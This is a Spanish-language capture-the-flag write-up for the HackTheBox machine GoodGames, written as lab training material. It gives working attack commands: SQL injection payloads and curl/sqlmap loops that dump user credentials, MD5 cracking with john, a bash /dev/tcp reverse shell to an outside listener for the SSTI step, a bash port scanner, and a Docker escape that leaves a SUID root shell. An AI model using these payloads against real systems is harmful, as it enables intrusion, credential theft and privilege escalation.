---
title: HTB Goodgames
date: 2023-09-13 14:10:00 +0800
author: Justice-Reaper
categories: [HTB, Linux]
tags:
  [
    SQLI (Error Based),
    Hash Cracking Weak Algorithms,
    Server Side Template Injection (SSTI),
    Docker Breakout (Privilege Escalation),
  ]
image:
  path: /assets/img/GoodGames/GoodGamesPortada.jpeg
---

## Reconocimiento

Se comprueba que la máquina está activa y se determina su sistema operativo a través del script implementado en bash `whichSystem.sh`

![Untitled](/assets/img/GoodGames/Untitled.png)

El sistema operativo es una `Linux`

### Nmap

Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de nmap.
Comando: `sudo nmap -p- --open -sS -T4 -vvv -n -Pn 192.168.1.20 -oG allPorts`

![Untitled](/assets/img/GoodGames/Untitled1.png)

Puertos abiertos son: `80`

Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados.

Comando: `nmap -sCV -p80,3306,33060 192.168.1.20 -oN targeted`

Obteniendo:

![Untitled](/assets/img/GoodGames/Untitled2.png)

### Web Enumeration

Nos dirigimos a la página web y se visualiza lo siguiente:

![Untitled](/assets/img/GoodGames/Untitled3.png)

Identificación de tecnologías y el gestor de contenido de la web a través `whatweb`

![Untitled](/assets/img/GoodGames/Untitled4.png)

De la información listada podemos decir que va a existir un panel para iniciar sesión, regresando a la web se dispone del siguiente panel web de sesión

![Untitled](/assets/img/GoodGames/Untitled5.png)

### Burp Suite

Activamos el FoxyProxy que tiene configurado el Burp Suite e interceptando una petición en el panel de autenticación, se tiene:

![Untitled](/assets/img/GoodGames/Untitled6.png)

Petición interceptada

![Untitled](/assets/img/GoodGames/Untitled7.png)

Redirigimos la petición al `Repeater`

![Untitled](/assets/img/GoodGames/Untitled8.png)

La petición de prueba nos está arrogando un `Internal server error!`

Se procede a probar si es vulnerable ataque SQLi, inyectando la típica query `' or 1=1-- -`

![Untitled](/assets/img/GoodGames/Untitled9.png)

Como se observa tenemos un acceso exitoso por lo que decimos que es vulnerable ataca `SQLi`.

Entonces se procede a realizar la inyección en la sección de proxy, para de esta forma redirigirlo a la página web para tener un acceso exitoso.

![Untitled](/assets/img/GoodGames/Untitled10.png)

Se presiona en la opción `Forward` para redirigir la petición a la página web y apagamos la intercepción del proxy.

![Untitled](/assets/img/GoodGames/Untitled11.png)

Se obtiene un acceso exitoso en la página web:

![Untitled](/assets/img/GoodGames/Untitled12.png)

![Untitled](/assets/img/GoodGames/Untitled13.png)

Vemos una rueda dentada en la esquina superior derecha de la página. Al hacer clic en el engranaje nos redirige a un nuevo subdominio llamado `internal-administration.goodgames.htb`

De primera instancia no podrá resolver el dominio, ya que se está realizando virtual hosting y tendremos que agregar el dominio en el `/etc/hosts`

Agregando dominio:

![Untitled](/assets/img/GoodGames/Untitled14.png)

Al visitar el nuevo subdominio vemos una página de inicio de sesión de `Flask Dashboard`.

![Untitled](/assets/img/GoodGames/Untitled15.png)

No disponemos de credenciales para lo cual se enumerara la base de datos.

### Enumeration MySQL

Se identifica el número de columnas de la tabla a través de `' order by 10-- -` primero se coloca un número muy grande y luego se lo va reduciendo hasta que cambia el valor de `Content-Length`

- `' order by 100-- -`
  No existe cambio en `Content-Length`

![Untitled](/assets/img/GoodGames/Untitled16.png)

- `' order by 20-- -`

  No existe cambio en `Content-Length`

  ![Untitled](/assets/img/GoodGames/Untitled17.png)

- `' order by 10-- -`
  No existe cambio en `Content-Length`

![Untitled](/assets/img/GoodGames/Untitled18.png)

- `' order by 5-- -`
  No existe cambio en `Content-Length`

![Untitled](/assets/img/GoodGames/Untitled19.png)

- `' order by 4-- -`
  **EXISTE** cambio en `Content-Length`

![Untitled](/assets/img/GoodGames/Untitled20.png)

Por lo que se puede concluir que la tabla dispone de 4 columnas

Se enumera el nombre de la base de datos actual

![Untitled](/assets/img/GoodGames/Untitled21.png)

Encontramos que se llama `main`

Listamos todas las bases de datos existentes en el sistema a través de `schema_name from information_schema.schemata`

![Untitled](/assets/img/GoodGames/Untitled22.png)

Obteniendo la base de datos `information_schema`, `main`

Listamos todas las tablas de la base de datos: `information_schema`

![Untitled](/assets/img/GoodGames/Untitled23.png)

Como se visualiza no podemos identificar las tablas entre tanto dato, por lo cual se limita la tabla a mostrar a través de la query `limit`

![Untitled](/assets/img/GoodGames/Untitled24.png)

A través de esta query nos permite ir listando tabla por tabla

![Untitled](/assets/img/GoodGames/Untitled25.png)

Se procede a listar las tablas por consola a través del comando `curl`

La regex que se va a utilizar para filtrar las columnas ser:

![Untitled](/assets/img/GoodGames/Untitled26.png)

Se va a realizar un bucle `for` para iterar sobre todas las columnas:

Estructura general bucle for:

```bash
for i in $(seq 1 100); do echo "[+] Para el numero $i: $()"; done
```

![Untitled](/assets/img/GoodGames/Untitled27.png)

Este bucle iterará del 0 al 100 y dentro `$()` deberíamos colocar el comando `curl` con la regex antes creada

Bucle `for` final:

```bash
for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables limit $i,1-- -&password=1234" | grep -i "welcome" | sed 's/^ *//' | cut -d '>' -f 2 | cut -d ' ' -f 2 | awk '{print $1}' FS='<')"; done
```

Obteniendo:

![Untitled](/assets/img/GoodGames/Untitled28.png)

![Untitled](/assets/img/GoodGames/Untitled29.png)

De donde es obtiene la tabla `user`

Con este bucle estamos listando **todas** las tablas del sistema

Se pudo haber enumerado solo la base de datos `main`

Comando:

```bash
for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,table_name from information_schema.tables where table_schema=\"main\" limit $i,1-- -&password=1234" | grep -i "welcome" | sed 's/^ *//' | cut -d '>' -f 2 | cut -d ' ' -f 2 | awk '{print $1}' FS='<')"; done
```

![Untitled](/assets/img/GoodGames/Untitled30.png)

Obteniendo la tabla `user`

Vamos a seguir la misma lógica que utilizamos en los laboratorios de [SQL](https://www.notion.so/SQL-Injections-c8f437aebd5243f1ae8c526c15106d59?pvs=21)

![Untitled](/assets/img/GoodGames/Untitled31.png)

Primero identificar la base da datos, luego enumerar la tablas, luego columnas y al final mostrar la data requerida.

Ya tenemos identificado la base de datos `main` y la tabla `user`

Continuando con la enumeración de columnas:

Comando:

```bash
for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,column_name from information_schema.columns where table_schema=\"main\" and table_name=\"user\" limit $i,1-- -&password=1234" | grep -i "welcome" | sed 's/^ *//' | cut -d '>' -f 2 | cut -d ' ' -f 2 | awk '{print $1}' FS='<')"; done
```

Obteniendo:

![Untitled](/assets/img/GoodGames/Untitled32.png)

Se identifica las columnas: `email`, `id`, `name`, `password`

Se muestra la data final

Obtenemos la data, comando:

```bash
for i in $(seq 0 100); do echo "[+] Para el numero $i: $(curl -s -X POST http://10.10.11.130/login --data "email=test@test.com' union select 1,2,3,group_concat(name,0x3a,email,0x3a,password) from user limit $i,1-- -&password=1234" | grep -i "welcome" | sed 's/^ *//' | cut -d '>' -f 2 | cut -d ' ' -f 2 | awk '{print $1}' FS='<')"; done
```

Obteniendo:

![Untitled](/assets/img/GoodGames/Untitled33.png)

Como se visualiza solo existe una data que en esta caso corresponde al admin

- admin:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec

Debemos romper la contraseña ya que se encuentra en formato MD5, se lo hará a través `jhon`

## Hash Cracking with Jhon

Se guarda el hash en un archivo y se sabe que es MD5 porque tiene una longitud de 32 caracteres y también lo validamos con `hash-identifier`

![Untitled](/assets/img/GoodGames/Untitled34.png)

Rompiendo el hash a traves de `jhon`

Comando: `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash`

![Untitled](/assets/img/GoodGames/Untitled35.png)

Se identifica que la contraseña es `superadministrator`

Disponemos de credenciales validas!!

Iniciaremos sesión en el panel de la pagina de `Flask Dashboard`

- username: `admin`
- Password: `superadministrator`

![Untitled](/assets/img/GoodGames/Untitled36.png)

Ingreso con éxito en el sistema como usuario administrador

## SQLmap

Guardar una peticion con Burp Suite

![Untitled](/assets/img/GoodGames/Untitled37.png)

![Untitled](/assets/img/GoodGames/Untitled38.png)

Enumeración base de datos

```bash
sqlmap -u http://10.10.11.130/login --data 'email=a&passwod=b' --batch --dbs
```

- Explicación Opciones:
  La opción "-u" indica la URL de la página web que se va a atacar, en este caso "http://10.10.11.130/login".
  La opción "--data" especifica los datos que se van a enviar al servidor en la petición POST, en este caso "email=a&password=b".
  La opción "--batch" indica que SQLmap debe ejecutarse en modo batch sin preguntar al usuario para ninguna confirmación.
  La opción "--dbs" indica que SQLmap debe enumerar las bases de datos disponibles en el servidor.

![Untitled](/assets/img/GoodGames/Untitled39.png)

Listar tablas

```bash
sqlmap -r reqLogin --batch -D main --tables
```

![Untitled](/assets/img/GoodGames/Untitled40.png)

Listar columnas

```bash
sqlmap -r ultimaPrueba --batch -D main -T user --columns
```

![Untitled](/assets/img/GoodGames/Untitled41.png)

Listar la data final

```bash
sqlmap -r ultimaPrueba --batch -D main -T user -dump
```

![Untitled](/assets/img/GoodGames/Untitled42.png)

---

## Intrusión

Identificamos tecnologías y gestor de contenido como en toda página web

![Untitled](/assets/img/GoodGames/Untitled43.png)

De donde se visualiza que trabaja con Flask y Python por lo cual sea muy probablemente vulnerable a Server Side Template Injection (`SSTI`)

Navegando a la página de configuración vemos que podemos editar nuestros datos de usuario.

Después de cambiar nuestro nombre de usuario a \{\{7\*7\}\} vemos que nuestro nombre de usuario se ha cambiado a 49 y nuestra carga útil SSTI se ha ejecutado.

![Untitled](/assets/img/GoodGames/Untitled44.png)

Se comprueba que es vulnerable para `SSTI`

En esta etapa sabemos que el sitio es vulnerable a SSTI por lo que podemos inyectar un payload y obtener un Shell. Primero codificar a `base64` nuestro payload, a continuación, iniciar un `netcat` a nivel local

Comando: `echo -ne 'bash -i >& /dev/tcp/10.10.14.7/4444' 0>&1 | base64`

Obteniendo:

![Untitled](/assets/img/GoodGames/Untitled45.png)

A continuación, construimos una carga útil `SSTI` básica para entregar in situ a través del campo de nombre.

También se podría levantar un servidor `http` con Python que contenga nuestra bash

![Untitled](/assets/img/GoodGames/Untitled46.png)

Y ejecutar el payload en la página web:

De esta manera se habrá ganado acceso al sistema:

![Untitled](/assets/img/GoodGames/Untitled47.png)

Ahora podemos entrar en el directorio de usuario y acceder a la bandera.

![Untitled](/assets/img/GoodGames/Untitled48.png)

Flag: `1436dc662fc6320f0a46dbd5550c4868`

## Privilege Escalation via Docker Escape

Después de obtener una shell en el sistema, rápidamente nos damos cuenta de que estamos en un contenedor Docker.

![Untitled](/assets/img/GoodGames/Untitled49.png)

Listando los directorios a través de `ls` nos percatamos que el directorio `home` del usuario `augustus` muestra que en lugar de su nombre, el UID `1000` como propietario de los archivos y carpetas disponibles. Esto indica que el directorio del usuario está montado dentro del contenedor docker desde el sistema principal.

Comprobando el montaje a través de `mount` vemos que el directorio de usuario del host está montado con el indicador de lectura/escritura activado.

![Untitled](/assets/img/GoodGames/Untitled50.png)

![Untitled](/assets/img/GoodGames/Untitled51.png)

La enumeración de los adaptadores de red disponibles muestra que la IP del contenedor es `172.19.0.2` .
Docker suele asignar la primera dirección de la subred al sistema anfitrión en las configuraciones por defecto, por lo que `172.19.0.1` podría ser la dirección IP interna de Docker del host

![Untitled](/assets/img/GoodGames/Untitled52.png)

Esto se ve claramente a través del comando `route`

![Untitled](/assets/img/GoodGames/Untitled53.png)

Vamos a escanear el host en `172.19.0.1` para ver qué puertos están disponibles como parte de las comprobaciones básicas de
movimiento lateral. Como nmap no está instalado podemos usar Bash en su lugar.

Utilizando:

```bash
#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!]Saliendo...\n"
  tput cnorm; exit 1
}

# Ctrl + C
trap ctrl_c INT

tput civis
for port in $(seq 1 65535);do
  timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Puerto $port - OPEN" &
done;wait
tput cnorm
```

Y convirtiéndolo en base64 para de esta manera copiarlo en la máquina víctima.
Comando:

```bash
base64 -w 0 portScan.sh | xclip -sel clip
```

En la máquina víctima se decodifica la cadena y se lo guarda en un archivo `portScan.sh`

![Untitled](/assets/img/GoodGames/Untitled54.png)

Se asigna permisos de escritura al script y se lo ejecuta:

![Untitled](/assets/img/GoodGames/Untitled55.png)

Se encuentra que SSH está escuchando internamente. Intentamos reutilizar la contraseña en las cuentas `root` y `augustus`.

![Untitled](/assets/img/GoodGames/Untitled56.png)

Esto tiene éxito y nos conectamos como `Augustus`

Sabiendo que el directorio de usuario está montado en el contenedor Docker, podemos escribir archivos en el Host y cambiar sus permisos a root desde dentro del contenedor. Estos nuevos permisos se reflejarán también en el sistema Host.

Copiar la bash al directorio de usuario como `augustus` que ya estamos autenticados como en el host y sal de la sesión SSH. Cambia la propiedad del ejecutable bash a `root:root` (propiedad de root y en el grupo root) desde el contenedor Docker y aplícale los permisos
permisos SUID.

Comandos:

```bash
# As augustus on host machine
cp /bin/bash .
exit
# As root in the docker container
chown root:root bash
```

Obteniendo:

![Untitled](/assets/img/GoodGames/Untitled57.png)

Volvemos a través de SSH de nuevo en el usuario `augustus` y se comprueba que los permisos de la bash tiene permisos SUID.

![Untitled](/assets/img/GoodGames/Untitled58.png)

Ejecute `./bash -p` y se abra otorgado una consola con privilegios root.

![Untitled](/assets/img/GoodGames/Untitled59.png)

Podremos listar la flag `root.txt`

- `656a6614929b1b887d58f7cfe0174d5d`
